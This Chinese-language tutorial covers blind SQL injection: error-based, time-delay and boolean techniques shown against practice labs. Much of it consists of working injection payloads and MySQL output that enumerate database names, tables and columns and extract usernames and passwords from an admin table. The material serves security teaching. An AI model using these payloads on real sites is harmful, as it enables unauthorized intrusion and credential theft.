# 原创
：  WEB漏洞-SQL注入之报错盲注

# WEB漏洞-SQL注入之报错盲注

## 一、导图

## 二、引论

当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句。

## 三、SQL语句在网站中的应用

### 1.select查询数据

```
在网站应用中进行数据显示查询操作
例: select * from news where id=$id
例: select id,email from member where username='$name'
```

### 2.insert插入数据

```
在网站应用中进行用户注册添加等操作
例: insert into news (id, url,text) values ( 2，'x','$t')
```

### 3.delete删除数据

```
后台管理里面删除文章删除用户等操作
例: delete from news where id=$id
```

### 4.update更新数据

```
会员或后台中心数据同步或缓存等操作
例: update user set pwd='$p' where id=2 and username=' admin'
```

### 5.order by排序数据

```
一般结合表名或列名进行数据排序操作
例: select * from news order by $id
例: select id , name , price from news order by $order
```

### 6.总结

可以通过以上查询方式与网站应用的关系来判断注入点产生地方，或猜测到网站的SQL查询方式。

### 7.实例

比如此网站在进行登录时需要填写账号和密码。

在注册页面需要填写昵称和密码，此步骤就相当于将相关信息写入到网站的数据库中，就相当于进行了使用insert语句执行了插入数据操作。

## 四、SQL注入---盲注

盲注就是在注入过程中，获取的数据不能回显至前端页面。

此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

```
盲注分为以下三类：

1.基于报错的sQL盲注-报错回显
    floor, updatexml, extractvalue 

2.基于布尔的sQL盲注-逻辑判断
    regexp, like , ascii,left, ord , mid

3.基于时间的sQL盲注-延时判断
    if ,sleep
```

参考链接：

### 1.报错盲注-报错回显

以下实例来自于pikachu靶场

#### insert报错盲注

#### update报错盲注

#### delete报错盲注

注意：在数据包内填写地址的时候空格要换成“+”或者“20%”，防止其与后面的内容混淆。

### 2.时间盲注实例-延时判断

此方法可不需要回显，根据返回时间可以进行数据库的猜解。

但是在实际渗透过程中由于受到网络的影响时间注入不是很靠谱，而且比较费时间。

以下实例来自于SQLi-LABS靶场

```
参考：
sleep(5)                            #SQL语句延时执行5秒
if(Condition,A,B)                   #当Condition为真时，返回A;当Condition为假时，返回B
like 'ro%'                          #判断ro或ro...是否成立
regexp '^ceshi[a-z]'                #匹配ceshi及ceshi...等
mid(a,b,c)                          #从位置b（从1开始）开始，截取a字符串的c位
substr(a,b,c)                       #从位置b（从1开始）开始，截取a字符串的c长度
left(a,b)                           #从左侧截取a字符串的前b位
length(database())=8                #判断数据库database()名的长度
limit a,b                           #a（从0开始）表示查询数据的起始位置，b表示返回的数量
ord=ascii ascii(x)=97               #判断x的ascii码是否等于97
```

#### sleep语句

```
mysql&gt; select * from member where id = 1;
+----+----------+----------------------------------+-----+-------------+---------+-------------------+
| id | username | pw                               | sex | phonenum    | address | email             |
+----+----------+----------------------------------+-----+-------------+---------+-------------------+
|  1 | vince    | e10adc3949ba59abbe56e057f20f883e | boy | 18626545453 | chain   | vince@pikachu.com |
+----+----------+----------------------------------+-----+-------------+---------+-------------------+
1 row in set (0.00 sec)

mysql&gt; select * from member where id = 1 and sleep(1);
Empty set (1.00 sec)

mysql&gt; select * from member where id = 1 and sleep(2);
Empty set (2.00 sec)

mysql&gt; select * from member where id = 1 and sleep(5);
Empty set (5.00 sec)
```

#### if语句

```
mysql&gt; select if(database()='a',123,456);
+----------------------------+
| if(database()='a',123,456) |
+----------------------------+
|                        456 |
+----------------------------+
1 row in set (0.00 sec)

mysql&gt; select if(database()='pikachu',123,456);
+----------------------------------+
| if(database()='pikachu',123,456) |
+----------------------------------+
|                              123 |
+----------------------------------+
1 row in set (0.00 sec)
```

#### if+sleep语句

```
mysql&gt; select * from member where id=1 and sleep(if(database()='a',5,0));
Empty set (0.00 sec)

mysql&gt; select * from member where id=1 and sleep(if(database()='pikachu',5,0));
Empty set (5.00 sec)
```

```
语句的意思是如果数据库名是pikachu就延迟5秒输出，不是的话就立即返回。
```

#### sleep+if+length

```
127.0.0.1:8080/sglilabs/less-2/?id=1%20and%20sleep(if(length(database())=1,5,0))--+
127.0.0.1:8080/sglilabs/less-2/?id=1%20and%20sleep(if(length(database())=8,5,0))--+
```

```
语句的意思是如果数据库名是8位就延迟5秒输出，不是的话就立即返回。
```

#### sleep+if+mid

```
127.0.0.1:8080/sglilabs/less-2/?id=1%20and%20sleep(if(mid(database(),1,1)=%27a%27,5,0)--+
127.0.0.1:8080/sglilabs/less-2/?id=1%20and%20sleep(if(mid(database(),1,1)=%27s%27,5,0)--+
```

```
语句的意思是如果数据库的第一位是s就延迟5秒输出，不是的话就立即返回。
```

#### sleep+if+ascii+limit+substr

```
http://127.0.01:8080/sqlilabs/less-2/?id=1 and if (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+
```

```
语句的意思是如果数据库的第一个表名的第一位的ascii码是101就延迟5秒输出，不是的话就立即返回。
```

---


```
mysql&gt; show tables;
+--------------------+
| Tables_in_security |
+--------------------+
| emails             |
| referers           |
| uagents            |
| users              |
+--------------------+
4 rows in set (0.00 sec)

mysql&gt; select * from users where id=1 and if (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0);
Empty set (3.00 sec)

mysql&gt; select * from users where id=1 and if (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=101,sleep(3),0);
Empty set (0.00 sec)

mysql&gt; select * from users where id=1 and if (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=100,sleep(3),0);
Empty set (0.00 sec)
```

### 3.布尔盲注实例-逻辑判断

布尔型（逻辑型）是计算机里的一种数据类型，只有True（真）和False（假）两个值。

页面在执行sql语句后，只显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。

```
参考：
mid(str,start,length)      #字符串截取
ORD()                      #转换成ascii码
Length()                   #统计长度
version()                  #查看数据库版本
database()                 #查看当前数据库名
user()                     #查看当前用户
```

以下实例来自于SQLi-LABS靶场

判断版本号。

```
mysql&gt; select version()
+-----------+
| version() |
+-----------+
| 5.5.53    |
+-----------+
1 row in set(0.00 sec)
```

判断版本号的前一位（第一位）是不是“5”。

判断版本号的第二位是不是“.”------错误判断方法（应将第一位也写入）。

判断版本号的第三位是不是“5”，应该将已经判断出来的第一、二位也写入，判断其前三位。

判断数据库名的前两位是不是“se”

---


#### 猜解获取数据库长度

```
' or length(database()) &gt; 8 --+    #符合条件返回正确，反之返回错误---&gt;1
```

#### 猜解数据库名

```
'or mid(database(),1,1)= 'z' --+    #因为需要验证的字符太多，所以转化为ascii码验证---&gt;1

'or ORD(mid(database(),1,1)) &gt; 100 --+    #通过确定ascii码，从而确定数据库名---&gt;2
```

#### 猜解表的总数

```
'or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 1  --+    #判断表的总数---&gt;2

'or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+    #判断表的总数---&gt;1
```

#### 猜解表名的长度

```
'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 4 --+    #判断第一个表的表名长度为4---&gt;2

'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+    #判断第一个表的表名长度为5---&gt;1

'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+    #判断第二个表的表名长度为5---&gt;2
```

#### 猜解第一个表的表名

```
'or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1 ),1,1) = 'a' --+    #通过字母判断---&gt;1

'Or ORD(mid(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1)) &gt;100 --+    #通过ascii码判断---&gt;2
```

#### 猜解表的字段的总数（列数）

```
'or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='表名') &gt; 5 --+    #判断表名长度大于5---&gt;1
```

#### 猜解第一个字段的长度（列名的长度）

```
'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 0,1) = 9 --+    #判断表的第一列长度为9---&gt;2

'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 0,1) = 10 --+    #判断表的第一列长度为10---&gt;1

'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 10 --+    #判断表的第二列长度为10---&gt;2
```

#### 猜解第一个字段名（列名）

```
'or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1) = 'i' --+    #通过字母判断---&gt;1

'or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1)) &lt; 100 --+    #通过ascii码判断---&gt;2
```

#### 直接猜解字段名（列名）

```
' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 'username' --+    #判断第二列的列名为username---&gt;1
```

#### 猜解内容长度

```
假如已经知道字段名分别为id、username、password
'or (select Length(concat(username,"---",password)) from admin limit 0,1) = 16 --+    #判断内容长度---&gt;1
```

#### 猜解内容

```
'or mid((select concat(username,"-----",password) from admin limit 0,1),1,1) = 'a' --+    #通过字母判断---&gt;1

'or ORD(mid((select concat(username,"-----",password) from admin limit 0,1),1,1)) &gt; 100 --+    #通过ascii码判断---&gt;2
```

#### 直接猜测内容

```
'or (Select concat(username,"-----",password) from admin limit 0,1 ) = 'admin-----123456' --+    #判断username为admin，password为123456---&gt;1
```
